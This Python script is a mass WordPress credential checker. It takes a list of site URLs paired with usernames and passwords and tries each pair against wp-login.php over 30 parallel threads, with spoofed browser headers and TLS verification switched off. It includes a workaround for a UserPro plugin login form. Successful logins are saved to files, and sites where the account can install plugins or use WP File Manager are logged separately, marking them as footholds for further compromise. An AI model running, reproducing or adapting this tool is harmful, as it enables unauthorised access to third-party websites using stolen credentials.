import requests, re, sys, os
from colorama import Fore
from colorama import init
from multiprocessing.dummy import Pool

init(autoreset=True)
requests.packages.urllib3.disable_warnings()
fr = Fore.RED
fw = Fore.WHITE
fg = Fore.GREEN

headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def URL_FOX(site):
    site = str(site)
    if (site.startswith('http://')) : site = site.replace('http://', ''); p = 'http://'
    elif (site.startswith('https://')) : site = site.replace('https://', ''); p = 'https://'
    else : p = 'http://'
    if ('/' in site): site = site.rstrip().split('/')[0]
    return '{}{}'.format(p, site)

def input_Fox(txt):
    try :
        if (sys.version_info[0] < 3): return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input().strip()
    except:
        pass

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if (str(admin) in str(panel)): return re.findall(re.compile('(.*){}'.format(admin)), panel)[0]
        return str(panel).decode('utf8')
    except:
        return str(panel)

def content_Fox(req):
    if (sys.version_info[0] < 3):
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def WP_Login_UPer(url, username, password):
    try:
        while (url[-1] == '/'): url = url[:-1]
        reqFox = requests.session()
        headersLogin = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'referer': '{}/wp-admin/'.format(url)}
        loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
        try: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
        except: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        if (URL_FOX(login_Fox.url) != URL_FOX(url)):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
            try: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
            except: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        login_Fox = content_Fox(login_Fox)
        if ('profile/login' in login_Fox):
            id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
            myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
            loginPost_Fox = {'template': 'login', 'unique_id': '{}'.format(id_wp), 'up_username': '0', 'user_action': '',
                             '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                             'action': 'userpro_process_form',
                             'force_redirect_uri-{}'.format(id_wp): '0', 'group': 'default',
                             'redirect_uri-{}'.format(id_wp): '', 'shortcode': '',
                             'user_pass-{}'.format(id_wp): password, 'username_or_email-{}'.format(id_wp): username}
            try: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
            except: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        try: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=headers, verify=False, timeout=30))
        except: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=headers, verify=False, timeout=15))
        if'wp-admin/profile.php' in check or 'wp-admin/upgrade.php' in check:
            open('Successfully_logged_WordPress.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, username, password))
            print(' -| {}{} -> Succeeded Login.'.format(url, fg))
            if 'plugin-install.php' in check:
                open('plugin-install.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, username, password))
                print(' -| {}{} -> Succeeded plugin-install.'.format(url, fg))
            if 'WP File Manager' in check:
                open('filemanager.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, username, password))
                print(' -| {}{} -> Succeeded Wp File Manager.'.format(url, fg))
        else: print(' -| {}{} -> Login Failed.'.format(url, fr)); return False
    except :
        print(' -| {}{} -> Time out.'.format(url, fr)); return False

def data_PL_Filter(panel):
    try:
        user = panel.split('#')[1].split('@')[0]
        pswd = re.findall(re.compile('#{}(.*)'.format(user)), panel)[0][1:]
        return user, pswd
    except:
        return False

def login(panel):
    try:
        if ('/wp-login.php' not in panel): return False
        data = data_PL_Filter(panel)
        if (data is False): return False
        WP_Login_UPer(URL_P(panel), data[0], data[1])
    except:
        return False

def mylist():
    try:
        try:
            target = open(sys.argv[1], 'r')
            return target
        except :
            yList = str(input_Fox('   Your List --> : '))
            if (not os.path.isfile(yList) and '.txt' not in yList):
                yList = '{}.txt'.format(yList)
            while (not os.path.isfile(yList)):
                print("\n   {}({}) File does not exist, You have to put your list in the same folder.\n".format(fr, yList))
                yList = str(input_Fox('   Your List --> : '))
            target = open(yList, 'r')
            return target
    except:
        return False

mp = Pool(30)
mp.map(login, mylist())